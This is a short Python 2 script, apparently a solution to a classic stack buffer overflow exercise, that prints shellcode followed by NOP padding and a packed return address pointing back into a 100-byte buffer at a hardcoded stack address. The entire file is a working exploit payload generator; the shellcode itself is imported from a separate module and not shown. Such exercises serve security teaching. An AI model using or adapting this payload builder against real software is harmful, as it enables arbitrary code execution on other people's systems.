from shellcode import shellcode
from struct import pack

ebp = 0xbffef468
buf = ebp - 8 - 100

padding = '\x90' * (ebp - buf + 4 - len(shellcode))

print shellcode + padding + pack("<I", buf)
